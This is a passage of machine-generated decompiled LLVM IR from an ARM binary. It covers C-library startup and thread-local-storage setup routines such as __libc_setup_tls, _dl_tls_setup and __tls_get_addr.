  %v2_189bc = add i32 %v2_189b8, %v4_18980
  %v3_189bc = inttoptr i32 %v2_189bc to i16*
  %v4_189bc = load i16, i16* %v3_189bc, align 2
  %v6_189bc = zext i16 %v4_189bc to i32
  %v1_189c0 = and i32 %v6_189bc, 8
  %v2_189c0 = icmp eq i32 %v1_189c0, 0
  br i1 %v2_189c0, label %dec_label_pc_189c8, label %dec_label_pc_1899c

dec_label_pc_189c8:                               ; preds = %dec_label_pc_189b4
  %v7_189c8 = icmp eq i32 %v0_189f8, 4
  br i1 %v7_189c8, label %dec_label_pc_189e0, label %dec_label_pc_189d0

dec_label_pc_189d0:                               ; preds = %dec_label_pc_189c8
  %v7_189d0 = icmp eq i8 %v2_189b4, 46
  br i1 %v7_189d0, label %dec_label_pc_189d8, label %dec_label_pc_18a30

dec_label_pc_189d8:                               ; preds = %dec_label_pc_189d0
  %v1_189d8 = add i32 %v0_189e4, 1
  store i32 %v1_189d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189f4

dec_label_pc_189e0:                               ; preds = %dec_label_pc_189c8
  %v2_189e0 = icmp eq i8 %v2_189b4, 0
  %v1_189e4 = add i32 %v0_189e4, 1
  store i32 %v1_189e4, i32* %r0.global-to-local, align 4
  br i1 %v2_189e0, label %dec_label_pc_189f4, label %dec_label_pc_189ec

dec_label_pc_189ec:                               ; preds = %dec_label_pc_189e0
  %v1_189ec = and i32 %v6_189bc, 32
  %v2_189ec = icmp eq i32 %v1_189ec, 0
  br i1 %v2_189ec, label %dec_label_pc_18a30, label %dec_label_pc_189f4

dec_label_pc_189f4:                               ; preds = %dec_label_pc_189ec, %dec_label_pc_189e0, %dec_label_pc_189d8
  %v0_1897c13 = phi i32 [ %v1_189e4, %dec_label_pc_189ec ], [ %v1_189e4, %dec_label_pc_189e0 ], [ %v1_189d8, %dec_label_pc_189d8 ]
  %v4_189f4 = mul i32 %v1_189f4, 256
  %v5_189f4 = or i32 %v0_189f4, %v4_189f4
  %v1_189f8 = add nuw nsw i32 %v0_189f8, 1
  %v7_18a00 = icmp slt i32 %v1_189f8, 5
  br i1 %v7_18a00, label %dec_label_pc_1897c, label %dec_label_pc_18a04

dec_label_pc_18a04:                               ; preds = %dec_label_pc_189f4
  %v2_18a04 = icmp eq i32 %v0_1895c, 0
  br i1 %v2_18a04, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_18a04
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18a34

bb:                                               ; preds = %dec_label_pc_18a04
  %v4_18a08 = udiv i32 %v5_189f4, 16777216
  %v2_18a0c = udiv i32 %v5_189f4, 256
  %v5_18a10 = and i32 %v2_18a0c, 65280
  %v2_18a14 = and i32 %v5_189f4, 65280
  %v5_18a18 = mul nuw nsw i32 %v2_18a14, 256
  %v5_18a1c = mul i32 %v0_189f4, 16777216
  %v6_18a10 = or i32 %v4_18a08, %v5_18a1c
  %v6_18a18 = or i32 %v6_18a10, %v5_18a10
  %v6_18a1c = or i32 %v6_18a18, %v5_18a18
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18a28 = inttoptr i32 %v0_1895c to i32*
  store i32 %v6_18a1c, i32* %v3_18a28, align 4
  %v2_18a34.pre = load i32, i32* %stack_var_-28, align 4
  %v1_18a38.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18a34

dec_label_pc_18a30:                               ; preds = %dec_label_pc_189d0, %dec_label_pc_189ec, %dec_label_pc_1897c, %dec_label_pc_1899c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18a34

dec_label_pc_18a34:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_18a30
  %v1_18a38 = phi i32 [ %v1_18a38.pre, %bb ], [ 0, %dec_label_pc_18a30 ], [ 1, %.thread8.thread ]
  %v2_18a34 = phi i32 [ %v2_18a34.pre, %bb ], [ %v3_1894c, %dec_label_pc_18a30 ], [ %v3_1894c, %.thread8.thread ]
  store i32 %v2_18a34, i32* @r4, align 4
  ret i32 %v1_18a38

; uselistorder directives
  uselistorder i32 %v1_189f8, { 1, 0 }
  uselistorder i32 %v5_189f4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_189e4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 65280, { 70, 0, 49, 1, 2, 3, 50, 51, 7, 8, 4, 9, 52, 53, 40, 10, 11, 12, 13, 14, 43, 44, 41, 42, 54, 55, 56, 47, 48, 45, 46, 57, 58, 59, 15, 16, 17, 18, 19, 60, 61, 20, 21, 22, 62, 23, 24, 63, 25, 26, 27, 28, 64, 29, 30, 65, 31, 32, 33, 34, 66, 67, 35, 36, 37, 38, 39, 68, 5, 69, 6, 71 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 19, 20, 0, 1, 2, 23, 25, 24, 21, 26, 27, 5, 22, 28, 7, 29, 6, 4, 8, 9, 30, 3, 31, 10, 13, 14, 12, 15, 11, 16, 17, 18 }
  uselistorder i16 0, { 0, 1, 2, 6, 7, 3, 8, 9, 10, 11, 12, 13, 14, 15, 4, 16, 5, 17, 18, 19, 20 }
  uselistorder i32 272, { 1, 0 }
  uselistorder label %dec_label_pc_18a34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18a30, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_189b4, { 1, 0 }
  uselistorder label %dec_label_pc_1897c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_18a50 = load i32, i32* @r4, align 4
  store i32 %v3_18a50, i32* %stack_var_-16, align 4
  %v4_18a54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_18a5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_18a64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 36) to i32*), align 4
  store i32 %v4_18a64, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_18a6c = inttoptr i32 %v4_18a54 to i32*
  %v2_18a6c = load i32, i32* %v1_18a6c, align 4
  %v4_18a70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 52) to i32*), align 4
  store i32 %v4_18a70, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_18a78 = add i32 %v2_18a6c, 15
  %v4_18a7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 144) to i32*), align 4
  store i32 %v4_18a7c, i32* @ip, align 4
  %v1_18a80 = load i32, i32* @r0, align 4
  %v2_18a80 = add i32 %v1_18a80, %v1_18a78
  %v1_18a84 = inttoptr i32 %v4_18a5c to i32*
  %v2_18a84 = load i32, i32* %v1_18a84, align 4
  store i32 %v2_18a84, i32* %r3.global-to-local, align 4
  %v1_18a88 = and i32 %v2_18a80, -16
  store i32 %v1_18a88, i32* %v1_18a6c, align 4
  %v0_18a90 = load i32, i32* @r0, align 4
  %v1_18a90 = load i32, i32* %r4.global-to-local, align 4
  %v2_18a90 = inttoptr i32 %v1_18a90 to i32*
  store i32 %v0_18a90, i32* %v2_18a90, align 4
  %v0_18a94 = load i32, i32* @r1, align 4
  %v1_18a94 = load i32, i32* %lr.global-to-local, align 4
  %v2_18a94 = inttoptr i32 %v1_18a94 to i32*
  store i32 %v0_18a94, i32* %v2_18a94, align 4
  %v0_18a98 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a98 = load i32, i32* @ip, align 4
  %v2_18a98 = inttoptr i32 %v1_18a98 to i32*
  store i32 %v0_18a98, i32* %v2_18a98, align 4
  %v2_18a9c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18a9c, i32* %r4.global-to-local, align 4
  %v1_18aa0 = load i32, i32* @r0, align 4
  ret i32 %v1_18aa0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_18aa8(i32 %arg1) local_unnamed_addr {
dec_label_pc_18aa8:
  %v0_18aa8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18aa8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18aa8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18aa8, %bb
  %v4_18ab8 = phi i32 [ %arg1, %dec_label_pc_18aa8 ], [ 0, %bb ]
  ret i32 %v4_18ab8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r3.global-to-local, align 4
  %v4_18acc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 84) to i32*), align 4
  store i32 %v4_18acc, i32* @lr, align 4
  %v4_18ad8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 10744) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 10744), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_18af8 = inttoptr i32 %v4_18ad8 to i32*
  store i32 1, i32* %v2_18af8, align 4
  %v0_18afc = load i32, i32* %r3.global-to-local, align 4
  %v1_18afc = load i32, i32* @lr, align 4
  %v2_18afc = inttoptr i32 %v1_18afc to i32*
  store i32 %v0_18afc, i32* %v2_18afc, align 4
  %v0_18b00 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_18b18(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18b18:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_18b18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18b18, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18b18
  %v2_18b18 = load i32, i32* @r4, align 4
  %v8_18b18 = ashr i32 %v2_18b18, %tmp
  %v9_18b18 = and i32 %v8_18b18, %tmp
  %v2_18b1c = load i32, i32* @ip, align 4
  %v8_18b1c = lshr i32 %v2_18b1c, %v9_18b18
  %v9_18b1c = and i32 %v8_18b1c, %v9_18b18
  store i32 %v9_18b1c, i32* %r0.global-to-local, align 4
  %v4_18b20 = inttoptr i32 %v9_18b1c to i32*
  store i32 %arg2, i32* %v4_18b20, align 4
  %v5_18b20 = load i32, i32* @r8, align 4
  %v6_18b20 = load i32, i32* %r0.global-to-local, align 4
  %v7_18b20 = sub i32 %v6_18b20, %v5_18b20
  store i32 %v7_18b20, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18b18, %bb
  %v8_18b20 = phi i32 [ %tmp, %dec_label_pc_18b18 ], [ %v7_18b20, %bb ]
  ret i32 %v8_18b20

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_18b2c = call i32 @__aeabi_read_tp()
  %v1_18b30 = inttoptr i32 %v0_18b2c to i32*
  %v2_18b30 = load i32, i32* %v1_18b30, align 4
  %v1_18b34 = add i32 %arg1, 4
  %v2_18b34 = inttoptr i32 %v1_18b34 to i32*
  %v3_18b34 = load i32, i32* %v2_18b34, align 4
  %v1_18b38 = add i32 %v2_18b30, 8
  %v2_18b38 = inttoptr i32 %v1_18b38 to i32*
  %v3_18b38 = load i32, i32* %v2_18b38, align 4
  %v2_18b3c = add i32 %v3_18b38, %v3_18b34
  ret i32 %v2_18b3c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18b48 = load i32, i32* @r4, align 4
  store i32 %v3_18b48, i32* %stack_var_-36, align 4
  %v6_18b48 = load i32, i32* @r5, align 4
  %v15_18b48 = load i32, i32* @r8, align 4
  %v18_18b48 = load i32, i32* @sb, align 4
  %v21_18b48 = load i32, i32* @sl, align 4
  %v24_18b48 = load i32, i32* @fp, align 4
  %v27_18b48 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %sl.global-to-local, align 4
  %v4_18b58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 104) to i32*), align 4
  store i32 %v4_18b58, i32* %r3.global-to-local, align 4
  %v1_18b5c = inttoptr i32 %v4_18b58 to i32*
  %v2_18b5c = load i32, i32* %v1_18b5c, align 4
  store i32 %v2_18b5c, i32* %r2.global-to-local, align 4
  %v2_18b60 = icmp eq i32 %v2_18b5c, 0
  %v0_18b68 = load i32, i32* %r0.global-to-local, align 4
  %v0_18b6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18b6c, i32* %ip.global-to-local, align 4
  br i1 %v2_18b60, label %dec_label_pc_18d34, label %dec_label_pc_18b74

dec_label_pc_18b74:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_18b78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 156) to i32*), align 4
  store i32 %v4_18b78, i32* @lr, align 4
  store i32 %v2_18b5c, i32* %r1.global-to-local, align 4
  %v1_18bc0 = inttoptr i32 %v4_18b78 to i32*
  %v2_18bc061 = load i32, i32* %v1_18bc0, align 4
  %v4_18bc462 = mul i32 %v2_18bc061, 32
  %v5_18bc463 = add i32 %v4_18bc462, %v2_18b5c
  store i32 %v5_18bc463, i32* %r3.global-to-local, align 4
  %v3_18bc865 = icmp ult i32 %v2_18b5c, %v5_18bc463
  br i1 %v3_18bc865, label %dec_label_pc_18b84, label %dec_label_pc_18d34.loopexit

dec_label_pc_18b84:                               ; preds = %dec_label_pc_18b74, %dec_label_pc_18bbc
  %v0_18b9c66 = phi i32 [ %v1_18bbc, %dec_label_pc_18bbc ], [ %v2_18b5c, %dec_label_pc_18b74 ]
  %v1_18b84 = inttoptr i32 %v0_18b9c66 to i32*
  %v2_18b84 = load i32, i32* %v1_18b84, align 4
  store i32 %v2_18b84, i32* %r3.global-to-local, align 4
  %v7_18b88 = icmp eq i32 %v2_18b84, 7
  br i1 %v7_18b88, label %dec_label_pc_18b90, label %dec_label_pc_18bbc

dec_label_pc_18b90:                               ; preds = %dec_label_pc_18b84
  %v1_18b90 = add i32 %v0_18b9c66, 20
  %v2_18b90 = inttoptr i32 %v1_18b90 to i32*
  %v3_18b90 = load i32, i32* %v2_18b90, align 4
  store i32 %v3_18b90, i32* %r3.global-to-local, align 4
  %v1_18b94 = add i32 %v0_18b9c66, 28
  %v2_18b94 = inttoptr i32 %v1_18b94 to i32*
  %v3_18b94 = load i32, i32* %v2_18b94, align 4
  store i32 %v3_18b94, i32* @r6, align 4
  %v1_18b9c = add i32 %v0_18b9c66, 16
  %v2_18b9c = inttoptr i32 %v1_18b9c to i32*
  %v3_18b9c = load i32, i32* %v2_18b9c, align 4
  store i32 %v3_18b9c, i32* %r3.global-to-local, align 4
  %v1_18ba0 = add i32 %v0_18b9c66, 8
  %v2_18ba0 = inttoptr i32 %v1_18ba0 to i32*
  %v3_18ba0 = load i32, i32* %v2_18ba0, align 4
  store i32 %v3_18ba0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_18b94, %v0_18b6c
  %v0_18b6c.v3_18b94 = select i1 %tmp78, i32 %v0_18b6c, i32 %v3_18b94
  store i32 %v0_18b6c.v3_18b94, i32* %fp.global-to-local, align 4
  %v2_18bd8 = icmp eq i32 %v3_18b94, 0
  br i1 %v2_18bd8, label %dec_label_pc_18c00, label %bb

dec_label_pc_18bbc:                               ; preds = %dec_label_pc_18b84
  %v1_18bbc = add i32 %v0_18b9c66, 32
  store i32 %v1_18bbc, i32* %r1.global-to-local, align 4
  %v2_18bc0 = load i32, i32* %v1_18bc0, align 4
  %v4_18bc4 = mul i32 %v2_18bc0, 32
  %v5_18bc4 = add i32 %v4_18bc4, %v2_18b5c
  store i32 %v5_18bc4, i32* %r3.global-to-local, align 4
  %v3_18bc8 = icmp ult i32 %v1_18bbc, %v5_18bc4
  br i1 %v3_18bc8, label %dec_label_pc_18b84, label %dec_label_pc_18bc0.dec_label_pc_18d34.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_18b90
  %v2_18bdc = add i32 %v3_18b94, -1
  br label %dec_label_pc_18c04

dec_label_pc_18c00:                               ; preds = %dec_label_pc_18b90, %dec_label_pc_18d34
  %v0_18c14.pre = phi i32 [ %v0_18c14.pre.pre, %dec_label_pc_18d34 ], [ ptrtoint (i32* @global_var_23010.367 to i32), %dec_label_pc_18b90 ]
  %v1_18c04.pre = phi i32 [ %v1_18c04.pre.pre, %dec_label_pc_18d34 ], [ %v0_18b68, %dec_label_pc_18b90 ]
  %v1_18c2825 = phi i32 [ %v0_18d3c, %dec_label_pc_18d34 ], [ %v0_18b6c.v3_18b94, %dec_label_pc_18b90 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_18d34 ], [ %v3_18b90, %dec_label_pc_18b90 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_18d34 ], [ %v3_18b9c, %dec_label_pc_18b90 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_18d34 ], [ %v3_18ba0, %dec_label_pc_18b90 ]
  br label %dec_label_pc_18c04

dec_label_pc_18c04:                               ; preds = %bb, %dec_label_pc_18c00
  %storemerge80 = phi i32 [ %v2_18bdc, %bb ], [ 0, %dec_label_pc_18c00 ]
  %v0_18c04 = phi i32 [ %v2_18bdc, %bb ], [ 0, %dec_label_pc_18c00 ]
  %storemerge = phi i32 [ %v3_18b94, %bb ], [ 1, %dec_label_pc_18c00 ]
  %storemerge79 = phi i32 [ %v3_18b94, %bb ], [ 1, %dec_label_pc_18c00 ]
  %v0_18c14 = phi i32 [ ptrtoint (i32* @global_var_23010.367 to i32), %bb ], [ %v0_18c14.pre, %dec_label_pc_18c00 ]
  %v1_18c04 = phi i32 [ %v0_18b68, %bb ], [ %v1_18c04.pre, %dec_label_pc_18c00 ]
  %v1_18c28 = phi i32 [ %v0_18b6c.v3_18b94, %bb ], [ %v1_18c2825, %dec_label_pc_18c00 ]
  %stack_var_-52.3 = phi i32 [ %v3_18b90, %bb ], [ %stack_var_-52.0, %dec_label_pc_18c00 ]
  %stack_var_-48.3 = phi i32 [ %v3_18b9c, %bb ], [ %stack_var_-48.0, %dec_label_pc_18c00 ]
  %stack_var_-44.3 = phi i32 [ %v3_18ba0, %bb ], [ %stack_var_-44.0, %dec_label_pc_18c00 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_18c04 = add i32 %v1_18c04, %v0_18c04
  %v2_18c08 = udiv i32 %v2_18c04, %storemerge
  store i32 %v2_18c08, i32* %r0.global-to-local, align 4
  %v2_18c0c = mul i32 %v2_18c08, %storemerge
  store i32 %v2_18c0c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_18c14 = add i32 %v0_18c14, 72
  %v3_18c14 = inttoptr i32 %v2_18c14 to i32*
  %v4_18c14 = load i32, i32* %v3_18c14, align 4
  store i32 %v4_18c14, i32* %r3.global-to-local, align 4
  %v1_18c18 = inttoptr i32 %v4_18c14 to i32*
  %v2_18c18 = load i32, i32* %v1_18c18, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_18c20 = add i32 %v1_18c28, 1168
  %v2_18c24 = add i32 %v1_18c20, %stack_var_-52.3
  %v2_18c28 = add i32 %v2_18c24, %v2_18c0c
  %v2_18c2c = add i32 %v2_18c28, %v2_18c18
  store i32 %v2_18c2c, i32* %r0.global-to-local, align 4
  %v1_18c30 = call i32 @__GI_sbrk(i32 %v2_18c2c)
  %v1_18c34 = load i32, i32* %fp.global-to-local, align 4
  %v1_18c3c = sub i32 0, %v1_18c34
  store i32 10232, i32* %r4.global-to-local, align 4
  %v2_18c34 = add i32 %v1_18c30, 1167
  %v1_18c44 = add i32 %v2_18c34, %v1_18c34
  %v2_18c48 = and i32 %v1_18c44, %v1_18c3c
  store i32 %v2_18c48, i32* @r5, align 4
  %v1_18c50 = load i32, i32* %sl.global-to-local, align 4
  %v3_18c50 = add i32 %v1_18c50, 10232
  %v4_18c50 = inttoptr i32 %v3_18c50 to i32*
  store i32 62, i32* %v4_18c50, align 4
  %v0_18c58 = load i32, i32* @r5, align 4
  %v1_18c58 = load i32, i32* %sb.global-to-local, align 4
  %v2_18c58 = add i32 %v1_18c58, %v0_18c58
  store i32 %v2_18c58, i32* @ip, align 4
  %v0_18c5c = load i32, i32* %sl.global-to-local, align 4
  %v1_18c5c = load i32, i32* %r4.global-to-local, align 4
  %v2_18c5c = add i32 %v1_18c5c, %v0_18c5c
  store i32 %v2_18c5c, i32* %r4.global-to-local, align 4
  %v2_18c60 = add i32 %v0_18c5c, 11520
  store i32 %v2_18c60, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_18c58, i32* @r0, align 4
  %v2_18c74 = add i32 %v2_18c5c, 16
  %v3_18c74 = inttoptr i32 %v2_18c74 to i32*
  store i32 %v2_18c58, i32* %v3_18c74, align 4
  %v0_18c78 = load i32, i32* %sb.global-to-local, align 4
  %v1_18c78 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c78 = add i32 %v1_18c78, 40
  %v3_18c78 = inttoptr i32 %v2_18c78 to i32*
  store i32 %v0_18c78, i32* %v3_18c78, align 4
  %v0_18c7c = load i32, i32* @r3, align 4
  %v1_18c7c = trunc i32 %v0_18c7c to i8
  %v2_18c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_18c7c = add i32 %v2_18c7c, 20
  %v4_18c7c = inttoptr i32 %v3_18c7c to i8*
  store i8 %v1_18c7c, i8* %v4_18c7c, align 1
  %v0_18c80 = load i32, i32* %r4.global-to-local, align 4
  %v1_18c80 = add i32 %v0_18c80, 8
  store i32 %v1_18c80, i32* @r4, align 4
  %v0_18c84 = call i32 @memcpy()
  %v0_18c8c = load i32, i32* @r4, align 4
  %v1_18c8c = load i32, i32* @r5, align 4
  %v2_18c8c = inttoptr i32 %v1_18c8c to i32*
  store i32 %v0_18c8c, i32* %v2_18c8c, align 4
  %v0_18c90 = load i32, i32* @r5, align 4
  store i32 %v0_18c90, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_18c90, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_14580.556 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_18ca4 = load i32, i32* %sl.global-to-local, align 4
  %v2_18ca4 = add i32 %v0_18ca4, 84
  %v3_18ca4 = inttoptr i32 %v2_18ca4 to i32*
  %v4_18ca4 = load i32, i32* %v3_18ca4, align 4
  store i32 %v4_18ca4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10744, i32* %r1.global-to-local, align 4
  %v2_18cb0 = add i32 %v0_18ca4, 60
  %v3_18cb0 = inttoptr i32 %v2_18cb0 to i32*
  %v4_18cb0 = load i32, i32* %v3_18cb0, align 4
  store i32 %v4_18cb0, i32* %r0.global-to-local, align 4
  %v3_18cb8 = add i32 %v0_18ca4, 10744
  %v4_18cb8 = inttoptr i32 %v3_18cb8 to i32*
  store i32 64, i32* %v4_18cb8, align 4
  %v1_18cc0 = load i32, i32* %r8.global-to-local, align 4
  %v2_18cc0 = add i32 %v1_18cc0, 20
  %v3_18cc0 = inttoptr i32 %v2_18cc0 to i32*
  store i32 %stack_var_-44.3, i32* %v3_18cc0, align 4
  %v1_18cc8 = load i32, i32* %r8.global-to-local, align 4
  %v2_18cc8 = add i32 %v1_18cc8, 24
  %v3_18cc8 = inttoptr i32 %v2_18cc8 to i32*
  store i32 %stack_var_-48.3, i32* %v3_18cc8, align 4
  %v1_18cd0 = load i32, i32* %r0.global-to-local, align 4
  %v2_18cd0 = inttoptr i32 %v1_18cd0 to i32*
  store i32 1, i32* %v2_18cd0, align 4
  %v1_18cd8 = load i32, i32* %r8.global-to-local, align 4
  %v2_18cd8 = add i32 %v1_18cd8, 28
  %v3_18cd8 = inttoptr i32 %v2_18cd8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_18cd8, align 4
  %v0_18ce0 = load i32, i32* @r6, align 4
  %v2_18ce0 = icmp eq i32 %v0_18ce0, 0
  %v1_18ce4 = load i32, i32* %r8.global-to-local, align 4
  %v2_18ce4 = add i32 %v1_18ce4, 44
  %v3_18ce4 = inttoptr i32 %v2_18ce4 to i32*
  store i32 1, i32* %v3_18ce4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_18cec = load i32, i32* %sl.global-to-local, align 4
  %v1_18cec = load i32, i32* %r1.global-to-local, align 4
  %v2_18cec = add i32 %v1_18cec, %v0_18cec
  store i32 %v2_18cec, i32* %r2.global-to-local, align 4
  %v1_18cf0 = load i32, i32* @r6, align 4
  br i1 %v2_18ce0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_18c04
  store i32 %v1_18cf0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_18cfc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_18cfc35 = add i32 %v1_18cfc34, 32
  %v3_18cfc36 = inttoptr i32 %v2_18cfc35 to i32*
  store i32 %v1_18cf0, i32* %v3_18cfc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_18c04
  %v2_18cf4 = add i32 %v1_18cf0, -1
  store i32 %v2_18cf4, i32* %r0.global-to-local, align 4
  %v1_18cfc = load i32, i32* %r8.global-to-local, align 4
  %v2_18cfc = add i32 %v1_18cfc, 32
  %v3_18cfc = inttoptr i32 %v2_18cfc to i32*
  store i32 %v1_18cf0, i32* %v3_18cfc, align 4
  %v1_18d00 = load i32, i32* @r6, align 4
  store i32 %v1_18d00, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_18d04 = load i32, i32* %r8.global-to-local, align 4
  %v1_18d04 = load i32, i32* %r2.global-to-local, align 4
  %v2_18d04 = add i32 %v1_18d04, 28
  %v3_18d04 = inttoptr i32 %v2_18d04 to i32*
  store i32 %v0_18d04, i32* %v3_18d04, align 4
  %v0_18d08 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d08 = load i32, i32* %ip.global-to-local, align 4
  %v2_18d08 = inttoptr i32 %v1_18d08 to i32*
  store i32 %v0_18d08, i32* %v2_18d08, align 4
  %v0_18d0c = load i32, i32* %r0.global-to-local, align 4
  %v1_18d0c = load i32, i32* %r3.global-to-local, align 4
  %v2_18d0c = add i32 %v1_18d0c, %v0_18d0c
  store i32 %v2_18d0c, i32* %r0.global-to-local, align 4
  %v1_18d10 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_18ce0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_18d18.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_18d18 = phi i32 [ %v0_18d18.pre, %._crit_edge ], [ %v1_18d10, %bb54 ]
  %v2_18d14 = udiv i32 %v2_18d0c, %v1_18d10
  %v2_18d18 = load i32, i32* %sb.global-to-local, align 4
  %v3_18d18 = mul i32 %v2_18d14, %v0_18d18
  %v4_18d18 = add i32 %v2_18d18, %v3_18d18
  store i32 %v4_18d18, i32* @r0, align 4
  %v0_18d1c = load i32, i32* %fp.global-to-local, align 4
  %v2_18d1c = icmp ult i32 %v0_18d1c, 16
  %v0_18d1c. = select i1 %v2_18d1c, i32 16, i32 %v0_18d1c
  store i32 %v0_18d1c., i32* @r1, align 4
  %v2_18d2c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_18d2c, i32* @r4, align 4
  store i32 %v6_18b48, i32* @r5, align 4
